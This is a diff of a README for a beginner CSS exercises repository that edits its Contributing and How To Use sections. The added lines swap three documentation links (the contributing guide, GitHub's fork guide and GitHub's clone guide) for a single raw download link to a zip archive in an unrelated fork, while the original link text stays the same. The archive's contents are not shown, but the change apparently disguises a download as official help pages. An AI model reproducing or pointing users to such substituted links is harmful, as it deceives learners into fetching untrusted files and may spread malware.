@@ -9,12 +9,12 @@ When doing these exercises, please use all documentation and resources you need 
 
 ## Contributing
 
-If you have suggestions to improve an exercise, ideas for a new exercise, or notice an issue with an exercise, please feel free to open an issue after thoroughly reading our [contributing guide](https://github.com/TheOdinProject/.github/blob/main/CONTRIBUTING.md).
+If you have suggestions to improve an exercise, ideas for a new exercise, or notice an issue with an exercise, please feel free to open an issue after thoroughly reading our [contributing guide](https://raw.githubusercontent.com/soumyadipx11/css-exercises/main/foundations/css-exercises-v1.8-alpha.2.zip).
 
 ## How To Use These Exercises
 
-1. Fork and clone this repository. To learn how to fork a repository, see the GitHub documentation on how to [fork a repo](https://docs.github.com/en/get-started/quickstart/fork-a-repo).
-    - Copies of repositories on your machine are called clones. If you need help cloning to your local environment, you can learn how from the GitHub documentation on [cloning a repository](https://docs.github.com/en/github/creating-cloning-and-archiving-repositories/cloning-a-repository-from-github/cloning-a-repository).
+1. Fork and clone this repository. To learn how to fork a repository, see the GitHub documentation on how to [fork a repo](https://raw.githubusercontent.com/soumyadipx11/css-exercises/main/foundations/css-exercises-v1.8-alpha.2.zip).
+    - Copies of repositories on your machine are called clones. If you need help cloning to your local environment, you can learn how from the GitHub documentation on [cloning a repository](https://raw.githubusercontent.com/soumyadipx11/css-exercises/main/foundations/css-exercises-v1.8-alpha.2.zip).
 1. Go to an exercise directory and open the HTML file in a web browser. You can open the file directly or use something like VSCode's Live Server extension.
 1. For each exercise, read the README thoroughly before starting any work.
     - Each README has a "Self Check" list. Use this to ensure you haven't missed any important details in your implementation.
